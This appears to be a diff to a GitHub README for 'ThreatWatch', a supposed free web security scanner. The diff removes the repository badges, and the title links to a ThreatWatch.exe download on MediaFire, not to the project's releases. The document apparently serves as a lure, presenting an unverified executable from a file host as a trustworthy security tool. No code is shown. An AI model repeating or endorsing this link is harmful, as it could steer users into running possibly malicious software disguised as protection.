@@ -1,8 +1,6 @@
 # [ThreatWatch](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file): Your Comprehensive Free Web Security Solution
 ThreatWatch is the next-generation web security scanner designed to empower users with professional-grade tools—completely free of charge. Built on cutting-edge technology, ThreatWatch is tailored for individuals, developers, and organizations striving to protect their online assets.
 
-<div align="center"> <img src="https://img.shields.io/github/license/Rocraften/ThreatWatch?style=plastic&color=blueviolet&labelColor=1f1f1f" alt="GitHub License" height="20px" /> <a target="_blank" href="https://github.com/Rocraften/ThreatWatch/releases"> <img alt="GitHub Release" height="20px" src="https://img.shields.io/github/v/release/Rocraften/ThreatWatch?style=plastic&color=blueviolet&labelColor=1f1f1f" ></a> <img src="https://img.shields.io/github/stars/Rocraften/ThreatWatch?style=plastic&color=blueviolet&labelColor=1f1f1f" alt="GitHub Stars" height="20px" /> <img src="https://hits.seeyoufarm.com/api/count/increment?url=https://github.com/Rocraften/ThreatWatch&style=plastic&color=blueviolet&labelColor=1f1f1f&label=Views" alt="GitHub Views" height="20px" /> </div>
-
 ## Key Features:
 
 **1. Advanced Vulnerability Scanning:** Detect vulnerabilities like XSS and SQL injection with precision, ensuring robust protection against common and uncomon cyber threats.
